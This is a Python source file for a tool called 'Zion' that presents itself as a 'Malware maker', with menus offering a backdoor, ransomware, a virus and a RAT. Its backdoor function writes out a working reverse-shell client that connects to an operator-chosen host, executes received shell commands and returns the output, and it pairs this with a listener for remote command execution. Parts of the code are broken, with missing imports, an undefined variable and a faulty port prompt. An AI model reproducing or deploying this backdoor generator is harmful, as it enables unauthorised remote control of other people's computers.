import time as t
import os
import sys
from pystyle import Colors, Colorate
from colorama import Fore
import time

# Needed color stuff
y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX
red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
# End

# Update Config
VersionKey = 'https://raw.githubusercontent.com/Discordmodsbers/Zion/main/ServerKey.py'

version = '1.1'
# End

# Update 
def update():
  os.system("update.py")

def checker():
  url = VersionKey
  r = requests.get(url, allow_redirects=True)
  with open('ServerKey.py', 'wb') as f:
    f.write(r.content)
    f.close()
  if Key == version:
    print("Up To Date !")
    t.sleep(3)
  else:
    print(f"Update needed ! \n Please hit option 3 in the main menu \n If you dont then the code will be outdated and buggy.")
    while True:
      option = input("")
      if option =='y':
        update()
      elif option =='Y':
        update()
      else:
        print("Please note there will be bugs .")
        break

# End

ascii = """
███████╗██╗ ██████╗ ███╗   ██╗
╚══███╔╝██║██╔═══██╗████╗  ██║
  ███╔╝ ██║██║   ██║██╔██╗ ██║
 ███╔╝  ██║██║   ██║██║╚██╗██║
███████╗██║╚██████╔╝██║ ╚████║
╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝"""

bannerMALWARE = """
███████╗██╗ ██████╗ ███╗   ██╗
╚══███╔╝██║██╔═══██╗████╗  ██║
  ███╔╝ ██║██║   ██║██╔██╗ ██║
 ███╔╝  ██║██║   ██║██║╚██╗██║
███████╗██║╚██████╔╝██║ ╚████║
╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝

+===================+
| 1.) Backdoor      |
| 2.) Ransomware    |
| 3.) Virus         |
| 4.) Rat (updated) |
| 99.) Go back      |
+===================+"""

banner = """
███████╗██╗ ██████╗ ███╗   ██╗
╚══███╔╝██║██╔═══██╗████╗  ██║
  ███╔╝ ██║██║   ██║██╔██╗ ██║
 ███╔╝  ██║██║   ██║██║╚██╗██║
███████╗██║╚██████╔╝██║ ╚████║
╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                              
+===================+
| 1.) Malware maker |
| 2.) View hosts    |
| 3.) Update        |
| 4.) Settings      |
| 5.) Exit          |
+===================+"""



def menu():
  print(Colorate.Horizontal(Colors.yellow_to_red, banner, 1))
  while True:
    option = input("> ")
    if option =='1':
      transition()
      malware()
    elif option =='2':
      sys.exit('coming soon !')
    elif option =='3':
      update()
    else:
      clear()
      print(Colorate.Horizontal(Colors.yellow_to_red, banner, 1))

def malware():
  print(Colorate.Horizontal(Colors.yellow_to_red, bannerMALWARE, 1))
  while True:
    option = input("=> ")
    if option =='1':
      backdoor()
    elif option =='99':
      transition()
      menu()
    else:
      clear()
      print(Colorate.Horizontal(Colors.yellow_to_red, bannerMALWARE, 1))
      

def backdoor():
  name = input("Please enter Name => ")
  target = input("Please enter Host ==> ")
  port = input(int("Please enter Port ===> "))
  server = socket.socket()
  server.bind((target, port))
  with open(f'{name}.py', 'w') as f:
    f.write(f"""import socket
import subprocess
REMOTE_HOST = '{target}' # '192.168.43.82'
REMOTE_PORT = {port} # 2222
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")
while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)""")
    f.close()
  server.listen(1)
  client, client_addr = server.accept()
  while True:
    cmd = input("Enter Command: ")
    cmd = cmd.encode()
    client.send(cmd)
    print('[+] Command Sent [+]')
    output = client.recv(1024)
    output = output.decode()
    print(f"[+] {output} [+]")

def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Loading... {i}""")
		sys.stdout.flush()
		time.sleep(0.2)

def clear():
    system = os.name
    if system == 'nt':
        os.system('cls')
    elif system == 'posix':
        os.system('clear')
    else:
        print('\n'*120)
    return

def transition():
    clear()
    print(Colorate.Horizontal(Colors.yellow_to_red, ascii, 1))
    Spinner()
    clear()
	

if __name__ ==__name__:
  checker()
  transition()
  menu()
